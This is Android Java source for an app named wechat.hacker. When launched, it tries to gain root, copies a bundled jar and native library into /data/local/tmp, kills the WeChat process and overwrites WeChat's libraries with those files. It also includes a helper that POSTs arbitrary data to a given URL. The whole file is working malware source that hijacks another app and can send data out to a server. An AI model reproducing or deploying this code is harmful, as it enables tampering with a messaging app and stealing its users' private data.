package wechat.hacker;

import android.app.ActivityManager;
import android.support.annotation.NonNull;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Collection;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

import com.stericson.RootShell.execution.Command;
import com.stericson.RootTools.RootTools;

import wechat.hacker.http_requst;

public class MainActivity extends AppCompatActivity {

    private static final String LOG_TAG = "wechat_hacker";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // EoP Current Process ..
        int eop_stat=root.try_root();

        Log.d(LOG_TAG,"EoP Result :"+String.valueOf(eop_stat));
        if (0==eop_stat)
            execute_command("su");
        else
            Log.d(LOG_TAG,"EoP Success ..");

        try {  //  Copy kingkong.jar and libwechatCrashForJni.so from the asset of APK to path /data/local/tmp/ ..
            Log.d(LOG_TAG,"Ready to Open JAR and SO ..");
            InputStream kingkong_jar=getApplication().getAssets().open("kingkong.jar");
            InputStream libwechatcrashforjni_so=getApplication().getAssets().open("libwechatCrashForJni.so");

            Log.d(LOG_TAG,"Ready to Read JAR and SO ..");
            byte[] kingkong_jar_data=new byte[kingkong_jar.available()];
            kingkong_jar.read(kingkong_jar_data);
            kingkong_jar.close();
            byte[] libwechatcrashforjni_so_data=new byte[libwechatcrashforjni_so.available()];
            libwechatcrashforjni_so.read(libwechatcrashforjni_so_data);
            libwechatcrashforjni_so.close();

            Log.d(LOG_TAG,"Relaese kingkong.jar ..");
            execute_command("touch /data/local/tmp/kingkong.jar");
            execute_command("chmod 777 /data/local/tmp/kingkong.jar");
            FileOutputStream new_kingkong_jar_output=new FileOutputStream("/data/local/tmp/kingkong.jar");
            new_kingkong_jar_output.write(kingkong_jar_data);
            new_kingkong_jar_output.close();

            Log.d(LOG_TAG,"Relaese libwechatCrashForJni.so ..");
            execute_command("touch /data/local/tmp/libwechatCrashForJni.so");
            execute_command("chmod 777 /data/local/tmp/libwechatCrashForJni.so");
            FileOutputStream new_libwechatcrashforjni_so_output=new FileOutputStream("/data/local/tmp/libwechatCrashForJni.so");
            new_libwechatcrashforjni_so_output.write(libwechatcrashforjni_so_data);
            new_libwechatcrashforjni_so_output.close();

            Log.d(LOG_TAG,"Copy Success kingkong.jar and libwechatCrashForJni.so to /data/local/tmp/ ..");
        } catch (IOException e) {
            e.printStackTrace();
            Log.d(LOG_TAG,"Exception :"+e.toString());
        }

        execute_command("kill " + String.valueOf(get_wechat_pid()));  //  kill wechat ..

        replace_file("kingkong.jar");
        replace_file("libwechatCrashForJni.so");  //  replace wechat lib ..

    }

    private void execute_command(String command) {
        Command command_execute_state;
        try {
            Command command_ = new Command(1,command);
            command_execute_state = RootTools.getShell(true).add(command_);
            command_execute_state.finish();
        } catch (Exception exception) {
            Log.d(LOG_TAG,"Execute su EoP ERROR ..");
        }
    }

    private void replace_file(String file_name) {
        String source_copy_library_path="/data/local/tmp/"+file_name;
        String target_copy_library_path1="/data/app-lib/com.tencent.mm-1/";
        String target_copy_library_path2="/data/app-lib/com.tencent.mm-2/";
        String target_copy_library_path3="/data/data/com.tencent.mm/app_recover_lib/";

        execute_command("rm "+target_copy_library_path1+file_name);
        execute_command("cp "+source_copy_library_path+" "+target_copy_library_path1);
        execute_command("chmod 777 "+target_copy_library_path1+file_name);
        execute_command("rm "+target_copy_library_path2+file_name);
        execute_command("cp "+source_copy_library_path+" "+target_copy_library_path2);
        execute_command("chmod 777 "+target_copy_library_path2+file_name);
        execute_command("rm "+target_copy_library_path3+file_name);
        execute_command("cp "+source_copy_library_path+" "+target_copy_library_path3);
        execute_command("chmod 777 "+target_copy_library_path3+file_name);
    }

    private int get_wechat_pid() {
        ActivityManager activityManager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        List<ActivityManager.RunningAppProcessInfo> procList = null;
        int result=-1;

        procList = activityManager.getRunningAppProcesses();
        for (Iterator<ActivityManager.RunningAppProcessInfo> iterator = procList.iterator(); iterator.hasNext();)  {
            ActivityManager.RunningAppProcessInfo procInfo = iterator.next();
            if(procInfo.processName.equals("com.tencent.mm")) {
                result=procInfo.pid;
                break;
            }
        }
        return result;
    }

    public static String send_data(String target_url,String additional_data) {
        http_requst request=new http_requst();
        String page_data="";

        Log.d(LOG_TAG,target_url);
        try {
            Map<String,String> post_data=new HashMap<String,String>();
            post_data.put("data",additional_data);
            page_data=request.doPost(target_url,post_data);

            Log.d(LOG_TAG,page_data);
        } catch (Exception exception) {
            Log.d(LOG_TAG,"Exception ! " + exception.toString());
        }
        return page_data;
    }
}
